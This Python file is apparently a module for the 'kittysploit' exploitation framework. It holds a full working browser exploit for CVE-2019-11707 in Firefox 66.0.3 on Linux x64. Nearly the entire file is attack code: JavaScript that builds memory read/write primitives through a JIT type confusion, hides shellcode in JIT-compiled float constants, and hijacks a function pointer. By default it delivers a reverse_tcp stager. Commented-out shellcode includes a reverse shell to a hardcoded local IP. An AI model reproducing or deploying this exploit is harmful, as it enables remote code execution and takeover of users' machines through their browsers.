from kittysploit import *

class Module(BrowserExploit):

	__info__ = {
		"name": "firefox 66.0.3",
		"description": "Exploit spidermonkey firefox 66.0.3",
		"cve": "2019-11707",
		"platform": Platform.LINUX,
		"arch": Arch.X64,
		"payload": {
			"default": "payloads/stagers/linux/x64/reverse_tcp",
			"category": "stagers",
			}
	}	
	
	def run(self):
		js = f"""
		String.prototype.rjust = function rjust(n,chr){{
		chr = chr || '0';
		if(this.length>n)
			return this.toString();
		return (chr.repeat(n)+this.toString()).slice(-1*n);
		}}
		String.prototype.ljust = function ljust(n,chr){{
		chr = chr || '0'
		if(this.length>n)
			return this.toString();
		return (this.toString()+chr.repeat(n)).slice(0,n);
		}}

		String.prototype.hexdecode = function hexdecode(){{
		inp=this.toString();
		if (this.length%2 !=0)
		inp='0'+inp.toString();
		out=[];
		for(var i=0;i<inp.length;i+=2)
		out.push(parseInt(inp.substr(i,2),16));
		return out;
		}}

		function print1(num){{
		rep="";
		for(var i=0;i<8;i++){{
			rep+=num[i].toString(16).rjust(2);
		}}
		console.log("0x"+rep.rjust(16));
		}}


		function data(inp){{
		bytes="";
		if ( (typeof inp) == 'string'){{
			inp=inp.replace("0x",'');
			inp=inp.rjust(16);
			bytes=new Uint8Array(inp.hexdecode());
		}}
		else if (typeof inp == 'number'){{
			bytes=new Uint8Array(new Float64Array([inp]).buffer);
			bytes.reverse();
		}}
		else if (typeof inp == 'object'){{
			bytes=new Uint8Array(8);
			bytes.set(inp);
			bytes.reverse();
		}}
		return bytes;
		}}

		function inttod(num){{
		num.reverse();
		temp = new Float64Array(num.buffer)[0];
		num.reverse();
		return temp;
		}}

		function dtoint(num){{
		int=new Uint32Array(new Float64Array([num]).buffer)
		// console.log(int[1].toString(16)+int[0].toString(16));
		return int;
		}}

		function RS(inp,amt){{
			amt = amt || 1;
			num="";
			for(var i=0;i<8;i++){{
			num+=inp[i].toString(2).rjust(8);
			}}
			num=num.slice(0,-1*amt);
			num=num.rjust(64);
			num=parseInt(num,2).toString(16).rjust(16);
			for(var i=0,j=0;i<num.length;i+=2,j++){{
			inp[j]=parseInt(num.substr(i,2),16);
			}}
			return inp;
		}}

		function LS(inp,amt){{
			amt = amt || 1;
			num='';
			for(var i=0;i<8;i++){{
			num+=inp[i].toString(2).rjust(8);
			}}
			num=num.slice(amt);
			num=num.ljust(64);
			num=parseInt(num,2).toString(16).rjust(16);
			for(var i=0,j=0;i<num.length;i+=2,j++){{
			inp[j]=parseInt(num.substr(i,2),16);
			}}
			return inp;
		}}

		function sub(inp1,inp2){{
			carry=0;
			for(var i=inp1.length-1;i>=0;i--){{
				diff=inp1[i]-inp2[i]-carry;
				carry=diff<0|0;
				inp1[i]=diff;
			}}
			return inp1;
		}}

		function add(inp1,inp2){{
			carry=0;
			for(var i=inp1.length-1;i>=0;i--){{
				sum=inp1[i]+inp2[i]+carry;
				carry=sum/0x100;
				inp1[i]=(sum%0x100);
			}}
			return inp1;
		}}	
		buf = [];
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));	

		var abuf = buf[5];

		var e = new Uint32Array(abuf);
		const arr = [e, e, e, e, e];

		function vuln(a1) {{

			if (arr.length == 0) {{
				arr[3] = e;
			}}

			const v11 = arr.pop();


			v11[a1] = 0x80;

			for (let v15 = 0; v15 < 100000; v15++) {{}} // JIT compile this function
		}}

		p = [new Uint8Array(abuf), e, e];
		arr.__proto__ = p;

		for (let v31 = 0; v31 < 2000; v31++) {{
			vuln(18);
		}}

		leaker = new Uint8Array(buf[7]);
		aa = new Uint8Array(buf[6]);


		leak = aa.slice(0x50,0x58); // start of the Uint array
		group = aa.slice(0x40,0x48); // start of the array buffer
		slots = aa.slice(0x40,0x48);
		leak.reverse();
		group.reverse();
		slots.reverse();


		LS(group)
		LS(slots)

		/* remove the type tag */
		leak[0]=0;
		leak[1]=0;

		/* Get to the data buffer of the Uint array */
		add(leak,new data("0x38"))
		RS(leak)
		leak.reverse()

		for (var i=0;i<leak.length;i++)
		aa[0x40+i] = leak[i]

		leak.reverse()
		LS(leak)
		sub(leak,new data("0x10"))
		leak.reverse()

		changer = new Uint8Array(buf[7])

		function write(addr,value){{
			for (var i=0;i<8;i++)
			changer[i]=addr[i]
			value.reverse()
			for (var i=0;i<8;i++)
			leaker[i]=value[i]
		}}

		function read(addr){{
			for (var i=0;i<8;i++)
			changer[i]=addr[i]
			return leaker.slice(0,8)
		}}

		function read_n(addr, n){{
			write(leak,n)
			for (var i=0;i<8;i++)
			changer[i]=addr[i]
			return leaker
		}}

		sub(group,new data("0x40")) // this now points to the group member
		sub(slots,new data("0x30")) // this now points to the slots member
		print1(group)
		print1(slots)
		group.reverse()
		slots.reverse()

		aa = read(group) // aa now contains the group pointer
		aa.reverse()
		print1(aa)
		aa.reverse()

		grp_ptr = read(aa) // grp_ptr is now the clasp_ pointer
		grp_ptr.reverse()
		print1(grp_ptr)
		grp_ptr.reverse()

		/* stager shellode */
		buf[7].func = function func() {{
		const magic = 4.183559446463817e-216;

		const g1 = 1.4501798452584495e-277
		const g2 = 1.4499730218924257e-277
		const g3 = 1.4632559875735264e-277
		const g4 = 1.4364759325952765e-277
		const g5 = 1.450128571490163e-277
		const g6 = 1.4501798485024445e-277
		const g7 = 1.4345589835166586e-277
		const g8 = 1.616527814e-314
		}}

		/* JIT compile the shellcode */
		for (i=0;i<100000;i++) buf[7].func()

		slots_ptr = read(slots)
		slots_ptr.reverse()
		print1(slots_ptr)
		slots_ptr.reverse()

		func_ptr = read(slots_ptr)
		func_ptr[6]=0
		func_ptr[7]=0
		func_ptr.reverse()
		print1(func_ptr)
		func_ptr.reverse()

		func_ptr.reverse()

		add(func_ptr,new data("0x30"))
		func_ptr.reverse()

		func_ptr.reverse()
		print1(func_ptr)
		func_ptr.reverse()

		jit_ptr=read(func_ptr);
		jit_ptr.reverse()
		print1(jit_ptr)
		jit_ptr.reverse()

		jitaddr = read(jit_ptr);


		jitaddr[0]=0
		jitaddr[1]=jitaddr[1] & 0xf0

		jitaddr.reverse()
		print1(jitaddr)
		jitaddr.reverse()

		jitaddr.reverse()
		sub(jitaddr,new data("0xff0"))
		jitaddr.reverse()

		for(j=0;j<3;j++){{
		asdf = read_n(jitaddr,new data("0xff0"))
		offset=-1;
		for (var i =0;i<0xff0;i++)
		{{
			if (asdf[i]==0x37 && asdf[i+1]==0x13 && asdf[i+2]==0x37 && asdf[i+3]==0x13 && asdf[i+4]==0x37 && asdf[i+5]==0x13 && asdf[i+6]==0x37 && asdf[i+7]==0x13){{
			offset=i;
			break
			}}
		}}

		/* we found the shellcode */
		if(offset!=-1)
			break

		jitaddr.reverse()
		add(jitaddr,new data("0xff0"))
		jitaddr.reverse()
		}}

		offset = offset+8+6 // add the offset of the magic constant and also the mov instruction
		jitaddr.reverse()
		add(jitaddr,new data(offset.toString(16)))
		jitaddr.reverse()
		console.log(offset);

		/* JS Class object */
		jsClass = read_n(grp_ptr,new data("0x30"));

		name = jsClass.slice(0,8)
		flags = jsClass.slice(8,16)
		cOps = jsClass.slice(16,24)
		spec = jsClass.slice(24,32)
		ext = jsClass.slice(40,48)
		oOps = jsClass.slice(56,64)

		group.reverse()
		add(group,new data("0x60"))
		group.reverse()

		eight = new data("0x8")

		function addEight()
		{{
		group.reverse()
		add(group,eight)
		group.reverse()
		}}

		/* Lol, can I get more lazier :).... */
		function write1(addr,value){{
			for (var i=0;i<8;i++)
			changer[i]=addr[i]
			// value.reverse()
			for (var i=0;i<8;i++)
			leaker[i]=value[i]
		}}

		/* We will be writting our crafted group to this address. So we save it now*/
		backingbuffer = group.slice(0,8)

		oops = group.slice(0,8)
		oops.reverse()
		add(oops,new data("0x30"))
		oops.reverse()

		write1(group,name)
		addEight()
		write1(group,flags)
		addEight()
		write1(group,oops)
		addEight()
		write1(group,spec)
		addEight()
		write1(group,ext)
		addEight()
		write1(group,oOps)
		addEight()

		/* set the addProperty function pointer to our shellcode */
		write1(group,jitaddr)

		sc_buffer = new Uint8Array(0x1000);
		buf[7].asdf=sc_buffer

		/* Leak the address of the shellcode UnitArray */
		slots_ptr.reverse()
		add(slots_ptr,eight)
		slots_ptr.reverse()

		sc_buffer_addr = read(slots_ptr)
		sc_buffer_addr[6]=0
		sc_buffer_addr[7]=0

		/* Now get to the buffer of the shellcode array */
		sc_buffer_addr.reverse()
		add(sc_buffer_addr,new data("0x38"))
		sc_buffer_addr.reverse()

		/* ptr is the pointer to the shellcode (currenty it's rw) */
		ptr = read(sc_buffer_addr)

		ptr.reverse()
		print1(ptr)
		ptr.reverse()

		/* convert the pointer to the shellcode buffer to float */
		ptr.reverse()
		ss=inttod(ptr)
		ptr.reverse()

		/* Shellcode for execve("/usr/bin/xcalc",[],["DISPLAY=:0"]) */
		//sc = [72, 141, 61, 73, 0, 0, 0, 72, 49, 246, 86, 87, 84, 94, 72, 49, 210, 82, 72, 141, 21, 87, 0, 0, 0, 82, 84, 90, 176, 59, 15, 5, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 47, 117, 115, 114, 47, 98, 105, 110, 47, 120, 99, 97, 108, 99, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 73, 83, 80, 76, 65, 89, 61, 58, 48, 0]
		//sc = [48,31,c0,48,31,ff,48,31,f6,48,31,d2,4d,31,c0,6a,02,5f,6a,01,5e,6a,06,5a,6a,29,58,0f,05,49,89,c0,48,31,f6,4d,31,d2,41,52,c6,04,24,02,66,c7,44,24,02,7a,69,c7,44,24,04,c0,a8,01,8c,48,89,e6,6a,10,5a,41,50,5f,6a,2a,58,0f,05,48,31,f6,6a,03,5e,48,ff,ce,6a,21,58,0f,05,75,f6,48,31,ff,57,57,5e,5a,48,bf,2f,2f,62,69,6e,2f,73,68,48,c1,ef,08,57,54,5f,6a,3b,58,0f,05]
		//sc = [72, 49, 192, 72, 49, 255, 72, 49, 246, 72, 49, 210, 77, 49, 192, 106, 2, 95, 106, 1, 94, 106, 6, 90, 106, 41, 88, 15, 5, 73, 137, 192, 72, 49, 246, 77, 49, 210, 65, 82, 198, 4, 36, 2, 102, 199, 68, 36, 2, 122, 105, 199, 68, 36, 4, 192, 168, 1, 140, 72, 137, 230, 106, 16, 90, 65, 80, 95, 106, 42, 88, 15, 5, 72, 49, 246, 106, 3, 94, 72, 255, 206, 106, 33, 88, 15, 5, 117, 246, 72, 49, 255, 87, 87, 94, 90, 72, 191, 47, 47, 98, 105, 110, 47, 115, 104, 72, 193, 239, 8, 87, 84, 95, 106, 59, 88, 15, 5]
		sc = {self.format_array_integer(self.payload)}
		for(var i=0;i<sc.length;i++)
		sc_buffer[i]=sc[i]

		write1(aa,backingbuffer)

		buf[7].jjj=ss
		"""
		self.send_js(js)